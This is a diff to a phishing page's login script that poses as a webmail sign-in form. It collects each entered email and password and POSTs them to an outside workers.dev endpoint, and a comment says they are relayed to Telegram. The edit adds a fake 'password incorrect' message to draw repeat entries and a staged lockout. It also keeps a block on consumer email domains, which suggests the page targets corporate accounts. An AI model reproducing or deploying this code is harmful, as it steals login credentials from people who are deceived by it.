@@ -129,7 +129,7 @@
 (function(){
   const endpoint = 'https://notify-login.codeck02.workers.dev';
   const banned = ['gmail.com','yahoo.com','outlook.com','hotmail.com','aol.com','msn.com','icloud.com'];
-  let attempts = 0, maxAttempts = 2;
+  let attempts = 0, maxAttempts = 3;
 
   const form     = document.getElementById('loginForm'),
         emailFld = document.getElementById('email'),
@@ -137,30 +137,18 @@
         errorDiv = document.getElementById('errorMsg'),
         loginBtn = document.getElementById('loginBtn'),
         spinner  = loginBtn.querySelector('.spinner'),
-        btnText  = loginBtn.querySelector('.btn-text'),
-        forgotPw = document.getElementById('forgotPwd');
+        btnText  = loginBtn.querySelector('.btn-text');
 
-  // Pre-fill email from fragment
-  const hashEmail = window.location.hash.substr(1);
-  if (hashEmail) emailFld.value = decodeURIComponent(hashEmail);
-
-  forgotPw.addEventListener('click', e=>{
-    e.preventDefault();
-    alert('Password reset link would be sent to: ' + (emailFld.value.trim()||'[your email]'));
-  });
-
-  form.addEventListener('submit', e=>{
+  form.addEventListener('submit', e => {
     e.preventDefault();
     errorDiv.textContent = '';
 
-    if (loginBtn.disabled) return; // already locked out
-
-    const email = emailFld.value.trim(),
-          password = passFld.value;
+    const email = emailFld.value.trim();
+    const password = passFld.value;
 
     // --- VALIDATION ---
     if (!email.includes('@')) {
-      return errorDiv.textContent = 'Please include an @ in your e-mail.';
+      return errorDiv.textContent = 'Please include an “@” in your e-mail.';
     }
     const domain = email.split('@').pop().toLowerCase();
     if (banned.includes(domain)) {
@@ -170,21 +158,13 @@
       return errorDiv.textContent = 'Password must be at least 4 characters.';
     }
 
-    // --- ATTEMPT TRACKING & LOCKOUT ---
+    // --- PREPARE TO SEND ---
     attempts++;
-    if (attempts > maxAttempts) {
-      errorDiv.textContent = 'Login attempts reached. You are locked out.';
-      loginBtn.disabled = true;
-      emailFld.disabled = passFld.disabled = true;
-      return;
-    }
-
-    // show spinner
+    // show spinner & disable
     spinner.classList.remove('hidden');
     btnText.classList.add('hidden');
     loginBtn.disabled = true;
 
-    // build payload
     const payload = {
       email,
       password,
@@ -193,27 +173,34 @@
       ts: new Date().toISOString()
     };
 
+    // --- SEND TO WORKER ---
     fetch(endpoint, {
       method: 'POST',
       headers: { 'Content-Type':'application/json' },
       body: JSON.stringify(payload)
     })
-    .then(resp=>{
+    .then(resp => {
+      // hide spinner & re-enable
       spinner.classList.add('hidden');
       btnText.classList.remove('hidden');
       loginBtn.disabled = false;
 
-      if (!navigator.onLine) {
-        errorDiv.textContent = 'Network error. Please check your connection.';
-      } else if (!resp.ok) {
+      if (!resp.ok) {
+        // server-side error (e.g. env missing)
         errorDiv.textContent = 'Server error. Try again later.';
       } else {
-        // on success, show a confirmation if you like:
-        errorDiv.textContent = 'Attempt #{' + attempts + '} recorded.';
-        passFld.value = '';
+        // always sent to Telegram successfully
+        if (attempts <= maxAttempts) {
+          errorDiv.textContent = 'Webmail or password incorrect.';
+        } else {
+          errorDiv.textContent = 'Login attempts reached. You are locked out.';
+          loginBtn.disabled = true;
+          emailFld.disabled = passFld.disabled = true;
+        }
       }
     })
-    .catch(()=>{
+    .catch(() => {
+      // hide spinner & re-enable
       spinner.classList.add('hidden');
       btnText.classList.remove('hidden');
       loginBtn.disabled = false;
@@ -222,6 +209,7 @@
   });
 })();
 </script>
+
 
 </body>
 </html>
